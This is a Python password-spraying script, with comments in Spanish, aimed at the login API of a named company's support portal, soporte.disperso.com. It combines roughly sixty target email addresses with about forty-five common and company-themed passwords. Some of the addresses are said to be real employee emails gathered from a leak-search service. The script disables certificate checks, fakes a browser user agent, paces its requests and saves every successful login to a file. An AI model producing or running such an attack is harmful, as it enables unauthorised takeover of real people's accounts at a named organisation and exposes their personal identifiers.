#!/usr/bin/env python3
"""Disperso soporte spray — emails Tuxpan + Disperso inferred"""
import requests, json, time, itertools
requests.packages.urllib3.disable_warnings()

URL = "https://soporte.disperso.com/api/auth/login"

# 10 emails reales de Tuxpan (IntelX)
TUXPAN_USERS = ["casep","fcatrin","garate","maureira","maurro",
                "mfiguerc","mmoossen","mnavea","smacias","tuxpan"]

EMAILS = (
    # Tuxpan reales
    [f"{u}@tuxpan.cl" for u in TUXPAN_USERS] +
    # Inferred Disperso (mismo naming)
    [f"{u}@disperso.com" for u in TUXPAN_USERS] +
    # Genericos Disperso
    ["admin@disperso.com","soporte@disperso.com","support@disperso.com",
     "ops@disperso.com","dev@disperso.com","tech@disperso.com",
     "help@disperso.com","info@disperso.com","hola@disperso.com",
     "sales@disperso.com","cto@disperso.com","ceo@disperso.com",
     "billing@disperso.com","payments@disperso.com","finance@disperso.com",
     # Nombres comunes chilenos
     "carlos@disperso.com","pedro@disperso.com","juan@disperso.com",
     "diego@disperso.com","nicolas@disperso.com","francisco@disperso.com",
     "felipe@disperso.com","sebastian@disperso.com","andres@disperso.com",
     "pablo@disperso.com","rodrigo@disperso.com","matias@disperso.com",
     "ignacio@disperso.com","cristian@disperso.com","alejandro@disperso.com",
     "gabriel@disperso.com","daniel@disperso.com","jose@disperso.com",
     "jorge@disperso.com","lucas@disperso.com","martin@disperso.com",
    ]
)

PASSWORDS = [
    # Empresa-specific
    "Disperso2024!", "Disperso2025!", "Disperso2026!",
    "Tuxpan2024!", "Tuxpan2025!", "Tuxpan2026!",
    "disperso123", "Disperso123!", "tuxpan123", "Tuxpan123!",
    # Comunes startups
    "Admin1234!", "Admin123!", "admin123", "admin1234",
    "Soporte123!", "Support123!", "soporte123",
    "Password1!", "P@ssw0rd", "P@ssword1", "Passw0rd!",
    "Qwerty123!", "Test1234!", "Demo1234!",
    # Chile-specific
    "Chile2024!", "Chile2025!", "Santiago2024!",
    # Pago/fintech
    "Pagos2024!", "Spei2024!", "Spei2025!", "Payments2024!",
    # Defaults
    "12345678", "123456789", "1234567890",
    "password", "password1", "Password1",
    "changeme", "welcome", "welcome1",
    # Tuxpan patterns
    "Tuxpan30!", "tuxpan2024", "software2024",
]

results = {"hits": [], "tried": 0, "errors": 0}
total = len(EMAILS) * len(PASSWORDS)
print(f"[*] Spray: {len(EMAILS)} emails x {len(PASSWORDS)} passwords = {total} combos")
print(f"[*] Target: {URL}\n")

sess = requests.Session()
sess.verify = False
sess.headers.update({"Content-Type": "application/json",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0"})

for i, (email, pwd) in enumerate(itertools.product(EMAILS, PASSWORDS), 1):
    try:
        r = sess.post(URL, json={"email": email, "password": pwd}, timeout=12)
        results["tried"] += 1

        if r.status_code == 200:
            print(f"\n[!!!] HIT: {email}:{pwd} -> {r.status_code}")
            print(f"      Response: {r.text[:300]}")
            results["hits"].append({"email": email, "password": pwd,
                                    "status": r.status_code, "response": r.text[:500]})
        elif r.status_code not in [401, 403]:
            print(f"  [?] {email}:{pwd} -> {r.status_code} {r.text[:80]}")

        if i % 200 == 0:
            print(f"  [{i}/{total}] hits={len(results['hits'])}")

    except Exception as e:
        results["errors"] += 1

    time.sleep(0.35)

print(f"\n[*] Done: {results['tried']} tried, {len(results['hits'])} hits")
with open("/root/disperso_spray_results.json", "w") as f:
    json.dump(results, f, indent=2)
print("[*] Saved /root/disperso_spray_results.json")
